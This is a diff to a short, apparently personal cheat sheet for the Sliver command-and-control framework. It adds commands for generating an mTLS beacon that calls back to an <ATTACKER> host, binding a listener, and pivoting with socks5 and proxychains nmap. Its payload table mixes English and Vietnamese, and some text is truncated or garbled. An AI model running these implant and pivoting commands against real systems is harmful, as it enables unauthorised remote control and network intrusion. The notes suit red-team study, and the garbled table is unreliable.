@@ -28,6 +28,11 @@ armory update
 # Implants
 Generating session-implants
 ## Beacons
+Generating
+```sliver
+generate beacon --mtls <ATTACKER>:<PORT> --seconds 60 --jitter 10
+```
+
 ```sliver
 tasks
 tasks fetch <ID>
@@ -41,7 +46,7 @@ interactive
 Create listener and killing jobs
 ```sliver
 <PROTOCOL> --lport <LPORT>
-http --lport 8080
+http --lport <IP>:8080
 
 jobs
 jobs -k <INT>
@@ -68,10 +73,10 @@ armory search
 ```
 # Payloads
 
-| Terminology | Description                                                                                                                                                                                                           |
-| ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Stageless   | Massive payloads that contains everything the packages to trigger the command and creates the session or beacon code, fully prepa                                                                                     |
-| Stagers Dropper sẽ với ra và lấy thêm mã, từ đó sẽ thực thi thêm lệnh và từ đó có thể tải toàn bộ mã độc để tạo session hoặc beacon. Có thể chạy trên memory và không cần chạy trên ổ đĩa, nhưng sẽ cần kết mạng nhiều hơn. ần  ạy  |
+| Terminology                                                                                                                                                                                                                 | Description                                                                                                                       |
+| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
+| Stageless                                                                                                                                                                                                                   | Massive payloads that contains everything the packages to trigger the command and creates the session or beacon code, fully prepa |
+| Stagers Dropper sẽ với ra và lấy thêm mã, từ đó sẽ thực thi thêm lệnh và từ đó có thể tải toàn bộ mã độc để tạo session hoặc beacon. Có thể chạy trên memory và không cần chạy trên ổ đĩa, nhưng sẽ cần kết mạng nhiều hơn. |                                                                                                                                   |
 Create stager payload
 ```sliver
 profiles
@@ -80,4 +85,9 @@ profiles
 ```sliver
 settings -h
 settings tables
+```
+# Pivoting
+```sliver
+socks5 start
+proxychains nmap -v -sn 172.16.5.1-254
 ```
